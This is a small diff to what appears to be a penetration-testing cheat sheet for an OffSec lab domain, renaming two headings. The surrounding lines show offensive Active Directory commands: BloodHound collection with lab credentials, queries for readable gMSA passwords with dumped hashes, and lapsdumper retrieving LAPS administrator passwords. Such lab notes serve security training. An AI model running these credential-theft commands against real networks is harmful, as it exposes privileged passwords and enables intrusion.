@@ -168,7 +168,7 @@ This will extract all json files if you have credential but no shell
 ```
 bloodhound-python --dns-tcp -ns $IP -d hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' -c all
 ```
-#### Read GMSAP Password
+#### Abusing Read GMSAP Password
 ```
 Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
 Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
@@ -191,7 +191,7 @@ Calculating hashes for Current Value
 [*]       aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988
 [*]       des_cbc_md5          : 0804169DCECB6102
 ```
-#### ReadLaps Password
+#### Abusing ReadLaps Password
 >LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. 
 ```
 lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -l 192.168.153.122
